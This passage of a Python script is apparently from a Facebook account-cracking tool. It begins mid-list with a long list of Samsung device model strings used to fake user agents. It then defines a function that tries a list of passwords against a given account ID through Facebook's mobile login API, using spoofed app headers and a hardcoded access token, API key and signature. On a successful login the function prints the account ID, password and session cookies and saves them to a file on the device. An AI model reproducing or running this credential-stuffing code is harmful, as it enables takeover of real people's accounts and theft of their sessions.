5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
    
 #__________________[ RANDOM METHOD4 ]__________________#           
def randm3(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mRANDOM-M4\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    gtt = random.choice(AMSS2)
    uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
    accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'email': ids, 
'password': pas, 
'adid': str(uuid.uuid4()),
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'session_id': str(uuid.uuid4()),
'advertiser_id': str(uuid.uuid4()),
'reg_instance': str(uuid.uuid4()),
'logged_out_id': str(uuid.uuid4()),
'locale': 'en_US', 
'client_country_code': 'US', 
'cpl': 'true', 'source': 'login',
'format': 'json', 
'omit_response_on_success': 'false', 
'credentials_type': 'password',
'error_detail_type': 'button_with_disabled',
'generate_session_cookies': '1',
'generate_analytics_claim': '1',
'generate_machine_id': '1',
'tier': 'regular',
'currently_logged_in_userid': '0',
'fb_api_req_friendly_name': 'authenticate', 
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3', 
'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head={'User-Agent':uaxx,
'Content-Type': 'application/x-www-form-urlencoded',
'x-fb-Connection-Type': 'MOBILE.LTE',
'Accept': '*/*',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'Priority' : 'u=3,i',
'Zero-Rated': '0',
'X-Fb-Connection-Quality': 'GOOD',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-Fb-Device-Group': '5120',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': str(len(content_lenght))}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);BIKKIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={BIKKIb};{ckkk}"
                print(f'\r\r{G1}[ARNAV-OK] {uid} | {pas}')
                print(f'\r\r{G1}|🍪|{R} {cookie}')
                open('/sdcard/ARNAV-RUNNING-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
        
        
if __name__ == '__main__':

    apvroval.check()
    


          
#__________________[ END ]__________________#